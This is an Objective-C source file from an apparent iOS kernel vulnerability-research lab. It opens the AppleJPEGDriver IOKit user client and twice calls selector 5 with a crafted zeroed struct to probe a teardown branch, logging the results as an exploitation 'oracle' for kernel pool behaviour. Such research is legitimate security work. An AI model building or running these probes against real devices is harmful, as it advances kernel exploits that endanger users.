//
//  P106JPEGTeardownOracle.m — the +0x30==0 two-call oracle (note 234).
//

#import "P106JPEGTeardownOracle.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <IOKit/IOKitLib.h>
#import <CoreFoundation/CoreFoundation.h>
#import <fcntl.h>
#import <string.h>
#import <unistd.h>

#define P106_BUILD @"p106-jpeg-teardown-oracle-v1"

static NSMutableString *g_log = nil;
static int g_fd = -1;
static void L(NSString *s) {
    if (!g_log) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_log appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); }
    }
}

@implementation P106JPEGTeardownOracle

+ (NSString *)tap {
    g_log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    g_fd = open([[docs stringByAppendingPathComponent:@"p106_jpeg_teardown_oracle_log.txt"] UTF8String],
                O_CREAT | O_WRONLY | O_TRUNC, 0644);

    L([NSString stringWithFormat:@"=== p106 session %@ BUILD %@ ===",
        LabLocalMilitaryNow(), P106_BUILD]);
    L(@"JPEG +0x30==0 EARLY-TEARDOWN two-call oracle (note 234). startDecoder 0x8b78fc.");
    L(@"[IDENT] JPEG request kalloc_type view (static decode 2026-10-21): site.JpegRequest");
    L(@"  element=0x458 ktflag=0x64 (GUARDED family; NOT the ANE KT_DATA_ONLY 0x6c) typecode=1122211111111122.");
    L(@"Oracle: sel5 struct [0]..[0x13] u32s; round1 +0x30=0 (surface omitted) -> teardown branch;");
    L(@"  round2 = repeated completion call. Censuses outSc/outsz per round.");
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p106"];
    if (stop) { L(stop); if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); } return g_log; }
    L([LabDeviceProfile identBlock]);

    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AppleJPEGDriver"));
    if (!svc) { L(@"[-] AppleJPEGDriver not found"); if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); } return g_log; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS || !conn) {
        L([NSString stringWithFormat:@"[-] open type=0 kr=0x%x", kr]);
        if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); }
        return g_log;
    }
    L([NSString stringWithFormat:@"[+] conn=0x%x (OPEN type=0)", conn]);

    /* the decode request struct: u32[0x14] — +0x30 = idx 12 = the in-surface
       pair; benign shapes otherwise (0x00/0x0c/0x14/0x24/0x48/0x4c left 0 =
       the unknown-mode subsampling FSM aborts cleanly per note 234). */
    for (int round = 1; round <= 2; round++) {
        uint8_t st[0x50]; memset(st, 0, sizeof(st));
        /* round1: in-surface pair +0x30 = 0 (the teardown branch).
           round2: same shape again = the "subsequent completion" call —
           after the round1 teardown the pool data differs (d16ab0 vs af0);
           the census = whether the second call completes or rejects.
           All-zero struct: every optional field omitted (the +0x344
           subsampling FSM's unknown mode aborts cleanly per note 234). */
        uint64_t out[8] = {0};
        uint32_t outc = 8;
        uint8_t stOut[0x100]; memset(stOut, 0, sizeof(stOut));
        size_t stOutSz = sizeof(stOut);
        L([NSString stringWithFormat:@"[round%d] sel5 struct0x50(+0x30=0) firing...", round]);
        kern_return_t k1 = IOConnectCallScalarMethod(conn, 5, out, 0, out, &outc);
        kern_return_t k2 = IOConnectCallStructMethod(conn, 5, st, sizeof(st), stOut, &stOutSz);
        L([NSString stringWithFormat:@"[round%d] scalar kr=0x%x (outc=%u) struct kr=0x%x (outsz=%zu)",
           round, k1, outc, k2, stOutSz]);
        /* log any non-zero out word (the outSc census) */
        int nw = 0;
        for (int i = 0; i < 8; i++) if (out[i]) { nw = 1; break; }
        if (nw) {
            L([NSString stringWithFormat:@"[round%d] outSc:", round]);
            for (int i = 0; i < 8; i++)
                if (out[i]) L([NSString stringWithFormat:@"  out[%d]=0x%llx", i,
                               (unsigned long long)out[i]]);
        }
        /* non-zero struct-out bytes census */
        int nb = 0;
        for (size_t i = 0; i < 0x40; i++) if (stOut[i]) { nb = (int)(i + 1); }
        if (nb) L([NSString stringWithFormat:@"[round%d] struct-out last-nonzero=+0x%x", round, nb]);
    }

    L(@"=== VERDICT: two-call sequence fired. Compare round1/round2 kr classes:");
    L(@"  EXPECT per note 234: BOTH dispatch decoder work (different pool data),");
    L(@"  no clean abort — a 2c2/2bc-class rejection on round1 = the branch is GATED.");
    L(@"HONESTY: oracle only. 2 requests. No fuzz. hasKread=NO.");
    IOServiceClose(conn);
    if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); }
    return g_log;
}

@end